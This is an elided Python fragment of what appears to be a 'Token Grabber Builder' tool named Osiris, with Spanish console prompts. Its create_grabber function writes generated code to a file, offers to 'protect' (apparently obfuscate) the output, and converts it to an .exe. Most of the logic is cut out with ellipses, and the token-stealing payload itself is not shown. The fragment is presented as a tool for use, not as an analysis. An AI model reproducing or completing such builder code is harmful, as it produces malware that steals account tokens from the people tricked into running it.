...
def create_grabber():
    ...
    with open(f"{fileName}.py", 'w', errors="ignore") as f:
        f.write(code)
    System.Title("Esperando respuesta...")
    tortuga(f"\n {Colors.purple}[{Colors.red}!{Colors.purple}]{Colors.white} ¿Deseas protejer {fileName}.exe?")
    ...
    System.Title("Convirtiendo a EXE...")
    print(f"\n {Colors.purple}[{Colors.light_blue}*{Colors.purple}]{Colors.light_green} Esto tomara unos minutos {Colors.gray}\n")
    ...
    try:
        ...
        pass
    System.Title("Token Grabber Builder :: Osiris")
